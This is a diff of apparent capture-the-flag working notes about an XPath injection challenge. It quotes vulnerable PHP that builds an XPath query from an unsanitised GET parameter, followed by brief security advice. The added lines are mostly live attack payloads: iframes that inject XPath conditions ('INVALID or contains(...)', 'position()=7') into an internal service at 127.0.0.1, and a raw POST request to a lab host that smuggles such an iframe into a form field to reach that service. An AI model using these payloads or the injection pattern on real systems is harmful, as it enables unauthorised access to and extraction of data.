@@ -43,7 +43,7 @@ id=2&title=RAM&desc=32GB of our custom RAM. Comes with much RGB.&comment=id=3&ti
   //
 
 
-  $predicate = $_GET['q'];
+$predicate = $_GET['q'];
 $query = "/orders/order[id=" . $predicate . "]";
 $results = $xml->xpath($query);
 
@@ -54,3 +54,30 @@ To secure against XPath injection, it's crucial to properly validate and sanitiz
 If you are unable to modify the code directly, and your attempts at exploiting the vulnerability have been unsuccessful, it's advisable to involve the development or security team responsible for the application. They can conduct a more in-depth analysis of the code and implement necessary security measures.
 
 Always ensure proper authorization for security testing, and follow ethical guidelines. If you have further questions or need additional assistance, feel free to ask.
+
+///
+///
+
+```
+<iframe src="http://127.0.0.1:8000/?q=INVALID or contains(.,'HTB')" width="800" height="500"></iframe>
+<iframe src="http://127.0.0.1:8000/?q=INVALID or contains(.,'Flag')" width="800" height="500"></iframe>
+<iframe src="http://127.0.0.1:8000/?q=INVALID or position()=7" width="800" height="500"></iframe>
+```
+
+POST /order.php HTTP/1.1
+Host: 83.136.251.235:35856
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 173
+Origin: http://83.136.251.235:35856
+Connection: close
+Referer: http://83.136.251.235:35856/
+Upgrade-Insecure-Requests: 1
+
+id=11242&title=<iframe src="http://127.0.0.1:8000/THINGS.php?q=INVALID or contains(.,'THINGS')" width="800" height="500"></iframe>"></iframe>&desc=Description&comment=Comment
+
+///
+///
